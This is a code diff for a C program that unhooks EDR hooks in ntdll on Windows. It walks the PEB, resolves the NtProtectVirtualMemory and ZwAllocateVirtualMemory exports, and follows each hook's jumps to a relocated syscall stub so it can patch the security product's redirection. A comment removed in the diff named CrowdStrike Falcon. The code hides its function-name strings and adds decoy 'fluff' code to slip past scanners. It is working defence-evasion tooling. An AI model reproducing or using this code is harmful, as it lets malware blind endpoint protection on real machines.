@@ -17,14 +17,14 @@ int expectedString(VOID * buf, int strSize) {
     return 0;
 }
 
-HMODULE hlpGetModuleHandle(LPWSTR lpModule, VOID * checkAddr) {
+HMODULE hlpGetModuleHandle(LPWSTR lpModule) {
     PEB * peb = (PEB *) __readgsqword(0x60);
 
     PEB_LDR_DATA * Ldr = (PEB_LDR_DATA *) peb->Ldr;
     LIST_ENTRY * pModuleList = &Ldr->InMemoryOrderModuleList;
     LIST_ENTRY * pListEntryFirst =  pModuleList->Flink;
 
-    // Fluff
+    // --- Fluff ---
     WCHAR * name = L"licenseCompliance";
     CHAR * additional = "gplTaxonomy";
     if (expectedString(name, sizeof(name)) == 2) {
@@ -35,6 +35,7 @@ HMODULE hlpGetModuleHandle(LPWSTR lpModule, VOID * checkAddr) {
             return NULL;
         }
     }
+    // -------------
 
     for (
         LIST_ENTRY * pListEntry = pListEntryFirst;
@@ -45,12 +46,6 @@ HMODULE hlpGetModuleHandle(LPWSTR lpModule, VOID * checkAddr) {
 
         if (lpModule != NULL) {
             if (lstrcmpiW(pEntry->BaseDllName.Buffer, lpModule) == 0) {
-                return pEntry->DllBase;
-            }
-        }
-
-        if (checkAddr != NULL) {
-            if (checkAddr >= pEntry->DllBase && checkAddr <= ((BYTE *) pEntry->DllBase + pEntry->SizeOfImage)) {
                 return pEntry->DllBase;
             }
         }
@@ -67,7 +62,7 @@ VOID * GetFunc(VOID * pModAddr, LPCSTR pFuncName) {
     IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS32 *) (pBaseAddr + pDosHeader->e_lfanew);
     IMAGE_OPTIONAL_HEADER * pOptionalHeader = &pNtHeaders->OptionalHeader;
 
-    // Fluff
+    // --- Fluff ---
     WCHAR * name = L"axaTriggerW";
     CHAR * additional = "axaTriggerA";
     if (expectedString(name, sizeof(name)) == 2) {
@@ -78,6 +73,7 @@ VOID * GetFunc(VOID * pModAddr, LPCSTR pFuncName) {
             return NULL;
         }
     }
+    // ------------
 
     IMAGE_DATA_DIRECTORY * pDataDir = (IMAGE_DATA_DIRECTORY *) &(pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
     IMAGE_EXPORT_DIRECTORY * pExportDir = (IMAGE_EXPORT_DIRECTORY *) (pBaseAddr + pDataDir->VirtualAddress);
@@ -104,7 +100,7 @@ VOID * GetFunc(VOID * pModAddr, LPCSTR pFuncName) {
 VOID * FindHook(VOID * pFunc, LPCSTR pFuncName) {
     BYTE * firstByte = (BYTE *) pFunc;
 
-    // Crude check for mov r10,rcx to determine whether function makes syscall or is implemented in module
+    // Crude check for mov r10,rcx to determine whether function is syscall stub, or fully implemented in module
     if (
         *firstByte != 0x4c ||
         *(firstByte + 1) != 0x8b ||
@@ -114,13 +110,12 @@ VOID * FindHook(VOID * pFunc, LPCSTR pFuncName) {
         return NULL;
     }
 
-    BYTE * fourthByteAddr = firstByte + 3; 
-    BYTE fourthByte = *fourthByteAddr;
+    BYTE * fourthByteAddr = firstByte + 3;
     if (
-        fourthByte == 0xeb ||
-        fourthByte == 0xe9 ||
-        fourthByte == 0xff ||
-        fourthByte == 0xea
+        *fourthByteAddr == 0xeb ||
+        *fourthByteAddr == 0xe9 ||
+        *fourthByteAddr == 0xff ||
+        *fourthByteAddr == 0xea
     ) {
         return fourthByteAddr;
     } else {
@@ -156,7 +151,7 @@ VOID * ResolveJmp(BYTE * jmpAddr, VOID ** nextInstructionOut) {
     return NULL;
 }
 
-WORD ScourModule(VOID * addrToFind, VOID ** unhookAddr) {
+WORD FindRelocatedStub(VOID * addrToFind, VOID ** unhookAddr) {
     MEMORY_BASIC_INFORMATION info;
 
     for (
@@ -164,7 +159,7 @@ WORD ScourModule(VOID * addrToFind, VOID ** unhookAddr) {
         VirtualQueryEx(GetCurrentProcess(), p, &info, sizeof(info)) == sizeof(info);
         p += info.RegionSize
     ) {
-        // Memory sections we want to include. In the case of Falcon, the section is COMMITTED/PRIVATE/RX
+        // Memory sections we want to include. In the example case, the section is COMMITTED/PRIVATE/RX
         if (info.State != MEM_COMMIT || info.Type != MEM_PRIVATE || info.Protect != PAGE_EXECUTE_READ) {
             continue;
         }
@@ -186,13 +181,13 @@ WORD ScourModule(VOID * addrToFind, VOID ** unhookAddr) {
                 // Only walk back 100 bytes. If it's not found within that, we are probably in the wrong place.
                 for (int backCounter = 1; backCounter < 100; backCounter++) {
                     if (
-                        *((BYTE *) finalJmpAddr - backCounter) == 0xb8 &&
-                        *((BYTE *) ((finalJmpAddr - backCounter) + 3)) == 0x00 &&
-                        *((BYTE *) ((finalJmpAddr - backCounter) + 4)) == 0x00
+                        *((BYTE *) finalJmpAddr - backCounter) == 0x4c &&
+                        *((BYTE *) ((finalJmpAddr - backCounter) + 1)) == 0x8b &&
+                        *((BYTE *) ((finalJmpAddr - backCounter) + 2)) == 0xd1
                     ) { 
                         *unhookAddr = (BYTE *) finalJmpAddr - backCounter;
                         
-                        WORD syscallID = *(WORD *)((BYTE *) ((finalJmpAddr - backCounter) + 1));
+                        WORD syscallID = *(WORD *)((BYTE *) ((finalJmpAddr - backCounter) + 4));
                         return syscallID;
                     }
                 }
@@ -213,6 +208,7 @@ BOOL PatchHeapAddr(BYTE * landingAddr, VOID * targetAddr) {
     DWORD offset = 0;
     int stackValCounter = 0;
 
+    // Count how many pushes to the stack are made before the jump
     while (*landingAddr == 0x51) {
         stackValCounter++;
         landingAddr++;
@@ -223,20 +219,23 @@ BOOL PatchHeapAddr(BYTE * landingAddr, VOID * targetAddr) {
         return FALSE;
     }
 
+    // Find the starting value of the heap address, pre-modification by the loop
+    // To do this we find the value moved into r10. This is the address of the next instruction + an offset
     offset = *((DWORD *) (nextLanding + 3));
     nextInstruction = nextLanding + 7;
-
     xorAddr1 = (VOID *) *((DWORDLONG *) (nextInstruction + offset));
 
+    // We then find the next value, which will be XOR'd with the first. We skip an instruction in the middle which isn't used in resolving the address.
+    // Then it is also a case of the next instruction + an offset
     nextInstruction = nextInstruction + 6;
     offset = *((DWORD *) (nextInstruction + 3));
-
     nextInstruction = nextInstruction + 7;
-
     xorAddr2 = (VOID *) *((DWORDLONG *) (nextInstruction + offset));
 
+    // XORing the two values gives us the initial address on the heap, before any modifications
     initialHeapAddr = ((DWORDLONG) xorAddr1) ^ ((DWORDLONG) xorAddr2);
 
+    // We then perform the same actions the loop does, adding 0x45 for each value previously pushed to the stack, and adding 0x28 on the end.
     patchAddr = initialHeapAddr + (0x45 * (stackValCounter)) + 0x28;
     printf("patchAddr: %p\nPress enter to patch...\n", patchAddr);
 
@@ -245,21 +244,17 @@ BOOL PatchHeapAddr(BYTE * landingAddr, VOID * targetAddr) {
     return TRUE;
 }
 
-int main(void) {
+BOOL Unhook(WCHAR * modName, CHAR * funcName) {
     VOID * unhookModule = NULL;
     VOID * funcAddr = NULL;
     VOID * funcAddrToFind = NULL;
 
-    // Function to unhook
-    WCHAR modName[] = L"ntdll.dll";
-    CHAR funcName[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
-    
     BYTE * firstJmp = NULL;
     BYTE * firstLanding = NULL;
     VOID * unhookAddr = NULL;
     WORD syscallID = NULL;
 
-    unhookModule = hlpGetModuleHandle(modName, NULL);
+    unhookModule = hlpGetModuleHandle(modName);
     if (unhookModule == NULL) {
         printf("Error retrieving base addr of module\n");
         return -1;
@@ -267,13 +262,12 @@ int main(void) {
 
     funcAddr = GetFunc(unhookModule, funcName);
     if (funcAddr == NULL) {
-        printf("Error retrieving address of func\n");
+        printf("Error retrieving address of func");
         return -1;
     }
 
     firstJmp = FindHook(funcAddr, funcName);
     if (firstJmp == NULL) {
-        printf("Function does not appear to be hooked\n");
         return -1;
     }
 
@@ -283,9 +277,9 @@ int main(void) {
         return -1;
     }
 
-    syscallID = ScourModule(funcAddrToFind, &unhookAddr);
+    syscallID = FindRelocatedStub(funcAddrToFind, &unhookAddr);
     if (unhookAddr == NULL) {
-        printf("[!] Unable to find unhook point\n");
+        printf("[!] Unable to find related stub\n");
         return -1;
     }
 
@@ -293,14 +287,46 @@ int main(void) {
     printf("[!] Final address to use for fix: %p\n", unhookAddr);
 
     PatchHeapAddr(firstLanding, unhookAddr);
-    puts("Press enter to allocate mem and change protections...");
+}
+
+int main(void) {
+    // Function to unhook
+    WCHAR modName[] = L"ntdll.dll";
+    CHAR allocate[] = { 'Z', 'w', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
+    CHAR protect[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
+
+    if (!Unhook(modName, allocate)) {
+        printf("[!] Error attempting to unhook function: %s\n", allocate);
+        return -1;
+    }
+
+    if (!Unhook(modName, protect)) {
+        printf("[!] Error attempting to unhook function: %s\n", protect);
+        return -1;
+    }
+
+    puts("Press enter to allocate mem...");
     getchar();
     
-    // Test it's worked. Set a breakpoint on the NTDLL syscall stub and step through. After a couple of jumps, it will jump straight to the relocated syscall stub
+    // Test to see if it's worked. Set a breakpoint on the NTDLL syscall stub and step through. After a couple of jumps, it will jump straight to the relocated syscall stub
+    VOID * mem = NULL;
     DWORD oldProt = NULL;
-    VOID * mem = HeapAlloc(GetProcessHeap(), 0, 100);
 
-    VirtualProtect(mem, 100, PAGE_EXECUTE_READ, &oldProt);
+    if (!(mem = VirtualAlloc(NULL, 100, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE))) {
+        printf("Error allocating mem: %d\n", GetLastError());
+        return -1;
+    }
+
+    printf("Location of mem: %p\nPress enter to change protections...\n", mem);
+    getchar();
+    
+    if (!VirtualProtect(mem, 100, PAGE_EXECUTE_READ, &oldProt)) {
+        printf("Error chaing protections: %d\n", GetLastError());
+        return -1;
+    }
+
+    puts("End of program.");
+    getchar();
 
     return 0;
 }
